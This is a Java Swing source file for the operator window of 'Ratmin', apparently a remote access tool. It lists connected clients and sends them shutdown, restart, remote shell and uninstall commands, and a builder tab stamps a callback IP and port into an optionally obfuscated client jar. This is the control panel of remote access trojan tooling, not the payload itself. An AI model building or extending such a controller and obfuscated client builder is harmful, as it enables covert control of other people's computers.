package me.slimig.ratmin.user_interface.Ui;

import java.awt.BorderLayout;
import java.awt.Color;
import java.awt.Dimension;
import java.awt.Font;
import java.awt.Toolkit;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.KeyAdapter;
import java.awt.event.KeyEvent;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;
import java.io.IOException;
import java.net.BindException;
import java.net.Socket;
import java.net.URISyntaxException;
import java.util.ArrayList;
import java.util.Iterator;

import javax.swing.GroupLayout;
import javax.swing.GroupLayout.Alignment;
import javax.swing.JButton;
import javax.swing.JCheckBox;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JMenu;
import javax.swing.JMenuItem;
import javax.swing.JOptionPane;
import javax.swing.JPanel;
import javax.swing.JPopupMenu;
import javax.swing.JScrollPane;
import javax.swing.JSpinner;
import javax.swing.JSpinner.DefaultEditor;
import javax.swing.JTabbedPane;
import javax.swing.JTable;
import javax.swing.JTextField;
import javax.swing.LayoutStyle.ComponentPlacement;
import javax.swing.SpinnerModel;
import javax.swing.SpinnerNumberModel;
import javax.swing.border.CompoundBorder;

import com.maxmind.geoip2.exception.GeoIp2Exception;

import me.slimig.ratmin.server.Server;
import me.slimig.ratmin.server.Streams;
import me.slimig.ratmin.user_interface.Ratmin;
import me.slimig.ratmin.user_interface.Config.ConfigManager;
import me.slimig.ratmin.utils.ClassEditor;
import me.slimig.ratmin.utils.Packets.Packet;

public class Ui extends JFrame {

    private static final long serialVersionUID = -4085079093711516765L;
    public static ArrayList<String> elements;
    public static Ui instance;
    public Object[][] elementArray;
    public static Socket selectedSocket;
    public static Streams selectedStreams;
    public static JTable table;

    private JTextField fname;
    private JTextField ipname;
    private JTextField portname;

    public JMenuItem disconnect;
    public static ShellUi shellui;
    private static JButton listenerbtn;
    private static JSpinner spinner;
    private static int port;
    public static JMenuItem copy = new JMenuItem("Copy");
    public static JMenuItem paste = new JMenuItem("Paste");
    public static ClientTableModel tableModel;

    public Ui() {
        setResizable(false);

        // BuilderUi bui = new BuilderUi();
        // SettingsUi sui = new SettingsUi();

        getContentPane().setBackground(Color.WHITE);
        setForeground(Color.WHITE);

        setIconImage(Toolkit.getDefaultToolkit().getImage(Ui.class.getResource("/resources/logo.png")));

        setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        setPreferredSize(new Dimension(666, 460));
        setTitle("Ratmin");
        getContentPane().setLayout(new BorderLayout());

        JTabbedPane tabbedPane = new JTabbedPane(JTabbedPane.TOP);
        tabbedPane.setBorder(new CompoundBorder());
        getContentPane().add(tabbedPane);

        JPanel clientspanel = new JPanel();
        clientspanel.setBackground(Color.WHITE);
        tabbedPane.addTab("Clients", null, clientspanel, null);

        tableModel = new ClientTableModel();

        final JPopupMenu popupMenu = new JPopupMenu();

        JMenu administration = new JMenu("Administration");

        JMenuItem shutdown = new JMenuItem("Shutdown");
        administration.add(shutdown);

        JMenuItem restart = new JMenuItem("Restart");
        administration.add(restart);

        JMenuItem remoteshell = new JMenuItem("Remote Shell");
        administration.add(remoteshell);

        shutdown.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                if (selectedStreams != null) {
                    selectedStreams.sendMsg("SHUTDOWN");
                    try {
                        Ratmin.ping(Ratmin.selserver);
                    } catch (IOException | GeoIp2Exception | URISyntaxException e1) {
                        e1.printStackTrace();
                    }
                }
            }
        });

        restart.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                if (selectedStreams != null) {
                    selectedStreams.sendMsg("RESTART");
                    try {
                        Ratmin.ping(Ratmin.selserver);
                    } catch (IOException | GeoIp2Exception | URISyntaxException e1) {
                        e1.printStackTrace();
                    }
                }
            }
        });

        remoteshell.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                if (selectedStreams != null) {
                    shellui = new ShellUi();
                    if (shellui.isVisible()) {
                        shellui.setVisible(false);
                    } else {
                        shellui.setVisible(true);
                    }
                }
            }
        });

        JMenu clientm = new JMenu("Client Management");

        JMenuItem disconnect_1 = new JMenuItem("Disconnect");
        clientm.add(disconnect_1);

        JMenuItem uninstall = new JMenuItem("Uninstall");
        clientm.add(uninstall);

        disconnect_1.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                if (selectedStreams != null) {
                    selectedStreams.sendMsg("CLOSE");
                    try {
                        Ratmin.ping(Ratmin.selserver);
                    } catch (IOException | GeoIp2Exception | URISyntaxException e1) {
                        e1.printStackTrace();
                    }
                }
            }
        });

        uninstall.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                if (selectedStreams != null) {
                    selectedStreams.sendMsg("UNINSTALL");
                    try {
                        Ratmin.ping(Ratmin.selserver);
                    } catch (IOException | GeoIp2Exception | URISyntaxException e1) {
                        e1.printStackTrace();
                    }
                }
            }
        });
        clientspanel.setLayout(new BorderLayout());

        popupMenu.add(administration);
        popupMenu.add(clientm);
        clientspanel.add(popupMenu);
        tabbedPane.setFocusable(false);
        // disconnect = new JMenuItem("Disconnect");

        table = new JTable();
        table.setFocusable(false);
        table.setFont(new Font("Tahoma", Font.PLAIN, 15));
        table.setBackground(Color.WHITE);

        table.setModel(tableModel);
        table.setDefaultRenderer(JLabel.class, new ClientTableCellRenderer());

        JScrollPane tablePanel = new JScrollPane(table);
        clientspanel.add(tablePanel);

        table.addMouseListener(new MouseAdapter() {
            @Override
            public void mouseClicked(MouseEvent ev) {
                if (ev.getButton() == MouseEvent.BUTTON3) {

                    int r = table.rowAtPoint(ev.getPoint());

                    if (r >= 0 && r < table.getRowCount()) {
                        table.setRowSelectionInterval(r, r);
                    } else {
                        table.clearSelection();
                    }

                    if (r >= 0) {
                        try {
                            Iterator<Socket> iterator = Ratmin.selserver.getMap().keySet().iterator();
                            selectedSocket = iterator.next();
                            for (int i = 0; i < Ratmin.selserver.getMap().size(); i++) {

                                if (selectedSocket.getInetAddress().toString().replace("/", "")
                                        .equalsIgnoreCase(table.getValueAt(table.getSelectedRow(), 0).toString())) {
                                    // System.out.println("Found correct socket! " +
                                    // selectedSocket.getInetAddress());
                                    i = Ratmin.selserver.getMap().size();
                                } else {
                                    /*
                                     * System.out.println( "Searching.." +
                                     * selectedSocket.getInetAddress().toString().replace("/", "") + " : " +
                                     * table.getValueAt(table.getSelectedRow(), 0) + "s");
                                     */
                                }
                            }

                            selectedStreams = Ratmin.selserver.getMap().get(selectedSocket);

                            popupMenu.show(getContentPane(), ev.getX() - 10, ev.getY() + 50);

                        } catch (NumberFormatException e) {

                        }

                    } else {
                        if (table.rowAtPoint(ev.getPoint()) == -1) {
                            table.clearSelection();
                        }
                    }
                }
            }
        });

        // Settings Tab Beginn
        JPanel settingspanel = new JPanel();
        tabbedPane.addTab("Settings", null, settingspanel, null);
        SpinnerModel model = new SpinnerNumberModel(0, // initial value
                0, // min
                9999, // max
                1); // step

        spinner = new JSpinner(model);
        spinner.setEditor(new JSpinner.NumberEditor(spinner, "0"));

        JLabel lblPortToListen = new JLabel("Port to listen on:");
        lblPortToListen.setFont(new Font("Arial", Font.PLAIN, 15));

        listenerbtn = new JButton();
        if (Ratmin.selserver != null) {
            if (Ratmin.selserver.isRunning()) {
                listenerbtn = new JButton("Stop listening");
                // TODO change port to config entry and disable input here
                // spinner.setModel(new SpinnerNumberModel(Ratmin.port,0, 9999, 0));
                spinner.setEnabled(false);
                port = Ratmin.port;
                ((DefaultEditor) spinner.getEditor()).getTextField().setEditable(false);
                spinner.setValue(Ratmin.port);
            } else {
                listenerbtn = new JButton("Start listening");
                spinner.setModel(model);
                spinner.setEnabled(true);
                ((DefaultEditor) spinner.getEditor()).getTextField().setEditable(true);
                spinner.setValue(Ratmin.port);
            }
        } else {
            listenerbtn = new JButton("Start listening");
            spinner.setModel(model);
            spinner.setEnabled(true);
            ((DefaultEditor) spinner.getEditor()).getTextField().setEditable(true);
            spinner.setValue(Ratmin.port);
        }

        listenerbtn.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent event) {
                if (Ratmin.selserver != null) {
                    if (Ratmin.selserver.isRunning()) {

                        try {
                            DisconnectAll();
                            Ratmin.selserver.stopServer();
                            System.out.println("Server Stopped!");
                            Ratmin.ping(Ratmin.selserver);
                        } catch (IOException e) {
                            e.printStackTrace();
                        } catch (GeoIp2Exception e) {
                            e.printStackTrace();
                        } catch (URISyntaxException e) {
                            e.printStackTrace();
                        }

                        listenerbtn.setText("Start listening");
                        spinner.setEnabled(true);

                        ((DefaultEditor) spinner.getEditor()).getTextField().setEditable(true);

                    } else {

                        try {
                            Ratmin.selserver = new Server((int) spinner.getValue());
                            port = (int) spinner.getValue();
                        } catch (BindException e) {
                            JOptionPane.showMessageDialog(null, "   Port already in use!", "Error", 0);
                        } catch (IOException e) {
                            e.printStackTrace();
                        }

                        Ratmin.selserver.startServer();
                        listenerbtn.setText("Stop listening");
                        spinner.setEnabled(false);
                        Ratmin.port = (int) spinner.getValue();
                        ConfigManager.editEntry("Port", spinner.getValue().toString());
                        ((DefaultEditor) spinner.getEditor()).getTextField().setEditable(false);
                    }
                } else {

                    try {
                        Ratmin.selserver = new Server((int) spinner.getValue());
                        port = (int) spinner.getValue();
                    } catch (BindException e) {
                        JOptionPane.showMessageDialog(null, "   Port already in use!", "Error", 0);
                    } catch (IOException e) {
                        e.printStackTrace();
                    }

                    Ratmin.selserver.startServer();
                    listenerbtn.setText("Stop listening");
                    spinner.setModel(new SpinnerNumberModel(port, 0, 9999, 0));
                    Ratmin.port = (int) spinner.getValue();
                    ConfigManager.editEntry("Port", spinner.getValue().toString());

                    ((DefaultEditor) spinner.getEditor()).getTextField().setEditable(false);
                }
            }
        });
        listenerbtn.setFont(new Font("Arial", Font.PLAIN, 13));

        final JCheckBox chckbxListenOnStart = new JCheckBox("Listen on startup");
        if (Boolean.valueOf(ConfigManager.readKey("ListenOnLaunch")) == true) {
            chckbxListenOnStart.setSelected(true);
        }
        chckbxListenOnStart.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent ev) {
                if (chckbxListenOnStart.isSelected()) {
                    ConfigManager.editEntry("ListenOnLaunch", "true");
                } else {
                    ConfigManager.editEntry("ListenOnLaunch", "false");
                }
            }
        });

        chckbxListenOnStart.setFont(new Font("Arial", Font.PLAIN, 15));

        final JCheckBox chckbxForwardPortUsing = new JCheckBox("Try to automatically port forward (UPnP)");
        if (Boolean.valueOf(ConfigManager.readKey("UPnP")) == true) {
            chckbxForwardPortUsing.setSelected(true);
        }
        chckbxForwardPortUsing.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent ev) {
                if (chckbxForwardPortUsing.isSelected()) {
                    ConfigManager.editEntry("UPnP", "true");
                    Ratmin.portforward(Integer.parseInt(ConfigManager.readKey("Port")));
                } else {
                    ConfigManager.editEntry("UPnP", "false");
                }
            }
        });
        chckbxForwardPortUsing.setFont(new Font("Arial", Font.PLAIN, 15));

        final JCheckBox chckbxShow = new JCheckBox("Show popup notification on new connection");
        if (Boolean.valueOf(ConfigManager.readKey("Notification")) == true) {
            chckbxShow.setSelected(true);
        }
        chckbxShow.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent ev) {
                if (chckbxShow.isSelected()) {
                    ConfigManager.editEntry("Notification", "true");
                } else {
                    ConfigManager.editEntry("Notification", "false");
                }
            }
        });
        chckbxShow.setFont(new Font("Arial", Font.PLAIN, 15));
        GroupLayout gl_settingspanel = new GroupLayout(settingspanel);
        gl_settingspanel.setHorizontalGroup(gl_settingspanel.createParallelGroup(Alignment.LEADING)
                .addGroup(gl_settingspanel.createSequentialGroup().addGap(93).addGroup(gl_settingspanel
                        .createParallelGroup(Alignment.LEADING)
                        .addGroup(gl_settingspanel.createSequentialGroup().addComponent(chckbxShow).addContainerGap())
                        .addGroup(gl_settingspanel.createParallelGroup(Alignment.LEADING)
                                .addGroup(gl_settingspanel.createSequentialGroup().addComponent(chckbxForwardPortUsing)
                                        .addContainerGap())
                                .addGroup(gl_settingspanel.createSequentialGroup().addGroup(gl_settingspanel
                                        .createParallelGroup(Alignment.LEADING).addComponent(chckbxListenOnStart)
                                        .addGroup(gl_settingspanel.createSequentialGroup().addComponent(lblPortToListen)
                                                .addPreferredGap(ComponentPlacement.RELATED)
                                                .addComponent(spinner, GroupLayout.DEFAULT_SIZE, 70, Short.MAX_VALUE)
                                                .addPreferredGap(ComponentPlacement.RELATED).addComponent(listenerbtn,
                                                        GroupLayout.PREFERRED_SIZE, 120, GroupLayout.PREFERRED_SIZE)
                                                .addGap(11)))
                                        .addGap(244))))));
        gl_settingspanel.setVerticalGroup(gl_settingspanel.createParallelGroup(Alignment.TRAILING)
                .addGroup(gl_settingspanel.createSequentialGroup().addContainerGap().addGroup(gl_settingspanel
                        .createParallelGroup(Alignment.LEADING)
                        .addComponent(listenerbtn, GroupLayout.PREFERRED_SIZE, 31, GroupLayout.PREFERRED_SIZE)
                        .addGroup(gl_settingspanel.createParallelGroup(Alignment.BASELINE).addComponent(lblPortToListen)
                                .addComponent(spinner, GroupLayout.DEFAULT_SIZE, 31, Short.MAX_VALUE)))
                        .addGap(18).addComponent(chckbxListenOnStart).addPreferredGap(ComponentPlacement.UNRELATED)
                        .addComponent(chckbxForwardPortUsing, GroupLayout.PREFERRED_SIZE, 27,
                                GroupLayout.PREFERRED_SIZE)
                        .addPreferredGap(ComponentPlacement.RELATED)
                        .addComponent(chckbxShow, GroupLayout.PREFERRED_SIZE, 27, GroupLayout.PREFERRED_SIZE)
                        .addGap(247)));
        settingspanel.setLayout(gl_settingspanel);

        // Settings Tab End

        // Builder Tab Beginn
        JPanel builderpanel = new JPanel();
        tabbedPane.addTab("Client Builder", null, builderpanel, null);

        JLabel ipto = new JLabel("IP");
        ipto.setFont(new Font("Arial", Font.BOLD, 15));
        ipto.setBounds(110, 63, 26, 32);

        ipname = new JTextField();
        ipname.setFont(new Font("Tahoma", Font.PLAIN, 16));
        ipname.setBounds(55, 93, 134, 32);

        ipname.setColumns(10);
        ipname.addKeyListener(new KeyAdapter() {
            @SuppressWarnings("deprecation")
            @Override
            public void keyTyped(KeyEvent e) {
                char c = e.getKeyChar();
                if (Character.isSpace(c) || Character.isWhitespace(c)) {
                    e.consume(); // Stop the event from propagating.
                }
            }
        });

        JLabel lblFileName = new JLabel("File name");
        lblFileName.setFont(new Font("Arial", Font.BOLD, 15));
        lblFileName.setBounds(86, -2, 134, 32);

        fname = new JTextField();
        fname.setFont(new Font("Tahoma", Font.PLAIN, 16));
        fname.setBounds(55, 26, 134, 32);
        fname.setColumns(10);
        fname.addKeyListener(new KeyAdapter() {
            @SuppressWarnings("deprecation")
            @Override
            public void keyTyped(KeyEvent e) {
                char c = e.getKeyChar();
                if (Character.isSpace(c) || Character.isWhitespace(c)) {
                    e.consume(); // Stop the event from propagating.
                }
            }
        });

        JLabel lblPort = new JLabel("Port");
        lblPort.setFont(new Font("Arial", Font.BOLD, 15));
        lblPort.setBounds(105, 125, 134, 32);

        final JCheckBox chckbxObfuscate = new JCheckBox("Obfuscate");

        chckbxObfuscate.setFont(new Font("Arial", Font.PLAIN, 14));

        JButton btnNewButton = new JButton("Build");
        btnNewButton.addMouseListener(new MouseAdapter() {
            @Override
            public void mouseClicked(MouseEvent ev) {
                if (ev.getButton() == MouseEvent.BUTTON1) {
                    if (!(fname.getText().equalsIgnoreCase("") && ipname.getText().equalsIgnoreCase("")
                            && portname.getText().equalsIgnoreCase(""))) {
                        if (fname.getText().contains(".jar")) {
                            if (chckbxObfuscate.isSelected()) {
                                ClassEditor.replaceSelected(ipname.getText(), portname.getText(), fname.getText(),
                                        true);
                            } else {
                                ClassEditor.replaceSelected(ipname.getText(), portname.getText(), fname.getText(),
                                        false);
                            }
                            fname.setText("");
                            ipname.setText("");
                            portname.setText("");

                        } else {
                            if (chckbxObfuscate.isSelected()) {
                                ClassEditor.replaceSelected(ipname.getText(), portname.getText(), fname.getText(),
                                        true);
                            } else {
                                ClassEditor.replaceSelected(ipname.getText(), portname.getText(),
                                        fname.getText() + ".jar", false);
                            }
                            fname.setText("");
                            ipname.setText("");
                            portname.setText("");
                        }
                    }
                }
            }
        });

        portname = new JTextField();
        portname.setFont(new Font("Tahoma", Font.PLAIN, 16));
        portname.setColumns(10);
        portname.setBounds(55, 159, 134, 32);
        portname.addKeyListener(new KeyAdapter() {
            @SuppressWarnings("deprecation")
            @Override
            public void keyTyped(KeyEvent e) {
                char c = e.getKeyChar();
                if (Character.isSpace(c) || Character.isWhitespace(c)) {
                    e.consume(); // Stop the event from propagating.
                }
            }
        });
        btnNewButton.setFont(new Font("Tahoma", Font.BOLD, 15));

        GroupLayout gl_builderpanel = new GroupLayout(builderpanel);
        gl_builderpanel.setHorizontalGroup(gl_builderpanel.createParallelGroup(Alignment.LEADING).addGroup(
                gl_builderpanel.createSequentialGroup().addContainerGap(225, Short.MAX_VALUE).addGroup(gl_builderpanel
                        .createParallelGroup(Alignment.LEADING)
                        .addGroup(Alignment.TRAILING, gl_builderpanel.createSequentialGroup().addGroup(gl_builderpanel
                                .createParallelGroup(Alignment.LEADING)
                                .addComponent(ipto, GroupLayout.PREFERRED_SIZE, 26, GroupLayout.PREFERRED_SIZE)
                                .addGroup(gl_builderpanel.createParallelGroup(Alignment.TRAILING, false)
                                        .addComponent(portname, Alignment.LEADING)
                                        .addComponent(ipname, Alignment.LEADING)
                                        .addGroup(gl_builderpanel.createParallelGroup(Alignment.LEADING)
                                                .addComponent(lblFileName, GroupLayout.PREFERRED_SIZE, 134,
                                                        GroupLayout.PREFERRED_SIZE)
                                                .addGroup(gl_builderpanel.createParallelGroup(Alignment.TRAILING, false)
                                                        .addComponent(fname, Alignment.LEADING, 201, 201,
                                                                Short.MAX_VALUE)
                                                        .addComponent(lblPort, Alignment.LEADING,
                                                                GroupLayout.PREFERRED_SIZE, 134,
                                                                GroupLayout.PREFERRED_SIZE)))
                                        .addComponent(chckbxObfuscate, Alignment.LEADING)))
                                .addGap(229))
                        .addGroup(Alignment.TRAILING, gl_builderpanel.createSequentialGroup()
                                .addComponent(btnNewButton, GroupLayout.PREFERRED_SIZE, 105, GroupLayout.PREFERRED_SIZE)
                                .addGap(273)))));
        gl_builderpanel.setVerticalGroup(gl_builderpanel.createParallelGroup(Alignment.LEADING).addGroup(gl_builderpanel
                .createSequentialGroup().addGap(19)
                .addComponent(lblFileName, GroupLayout.PREFERRED_SIZE, 32, GroupLayout.PREFERRED_SIZE)
                .addPreferredGap(ComponentPlacement.RELATED)
                .addComponent(fname, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE)
                .addPreferredGap(ComponentPlacement.UNRELATED)
                .addComponent(ipto, GroupLayout.PREFERRED_SIZE, 32, GroupLayout.PREFERRED_SIZE).addGap(15)
                .addComponent(ipname, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE)
                .addGap(26).addComponent(lblPort, GroupLayout.PREFERRED_SIZE, 32, GroupLayout.PREFERRED_SIZE)
                .addPreferredGap(ComponentPlacement.RELATED)
                .addComponent(portname, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE,
                        GroupLayout.PREFERRED_SIZE)
                .addPreferredGap(ComponentPlacement.RELATED, 31, Short.MAX_VALUE).addComponent(chckbxObfuscate)
                .addGap(18).addComponent(btnNewButton, GroupLayout.PREFERRED_SIZE, 38, GroupLayout.PREFERRED_SIZE)
                .addGap(22)));
        builderpanel.setLayout(gl_builderpanel);

        // Builder Tab End

        pack();
        setLocationRelativeTo(null);

    }

    public static void DisconnectAll() throws IOException, GeoIp2Exception, URISyntaxException {
        Iterator<Socket> iterator = Ratmin.selserver.getMap().keySet().iterator();
        Socket selectedSocket;
        for (int e = 0; e < Ratmin.selserver.getMap().size(); e++) {

            if (iterator.hasNext()) {
                selectedSocket = iterator.next();
                Streams selectedStreams = Ratmin.selserver.getMap().get(selectedSocket);
                selectedStreams.sendMsg(Packet.CLOSE.getPacketID());
            }
        }
        Ratmin.ping(Ratmin.selserver);
        Ratmin.UpdateTable();
    }
}
